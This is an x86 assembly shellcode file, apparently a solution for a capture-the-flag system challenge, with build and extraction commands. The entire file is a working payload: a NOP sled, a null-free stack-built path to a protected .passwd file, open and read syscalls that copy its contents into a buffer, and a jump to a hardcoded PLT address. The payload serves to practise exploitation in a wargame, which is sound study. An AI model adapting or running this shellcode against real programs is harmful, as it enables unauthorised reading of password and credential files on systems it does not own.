;  nasm -f elf -o out.o getpw.s
; first check for nulls:
;  objdump -d out.o
; or dump shellcode:
;  objcopy --output-target=binary --only-section=.text out.o getpw.bin

section .data
; crickets

section .text
global _start
_start:
; eax contains output buffer ptr
; [esp + 8] also contains output buffer ptr

; nop padding for the data we read
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop

; save eax (output buffer ptr)
mov edx, eax

; open("/challenge/app-systeme/ch32/.passwd", O_RDONLY = 0)
; eax=5, ebx="...", ecx=0
push 5
pop eax ; open

; push filename backwards on stack
; push 0x00647773 (\x00dws) but without null
push 0x647773AA
pop ebx
shr ebx, 0x8
push ebx
push 0x7361702e ; .pas
push 0x2f323368 ; h32/
push 0x632f656d ; me/c
push 0x65747379 ; yste
push 0x732d7070 ; pp-s
push 0x612f6567 ; ge/a
push 0x6e656c6c ; llen
push 0x6168632f ; /cha

mov ebx, esp
xor ecx, ecx ; O_RDONLY
int 0x80 ; syscall

; clean up stack
add esp, 36

; read(fd, buffer, 32)
; eax=3, ebx=fd, ecx=buffer, edx=32
mov ebx, eax
push 3
pop eax ; read
mov ecx, edx
push 32
pop edx
int 0x80 ; syscall

; no need because flag ends with newline
; put null at the end of the read
;xor ebx, ebx
; ptr += eax
;add ecx, eax
; *ptr = 0
;mov BYTE [ecx], bl

; jmp back to plt
push 0x080486a6
ret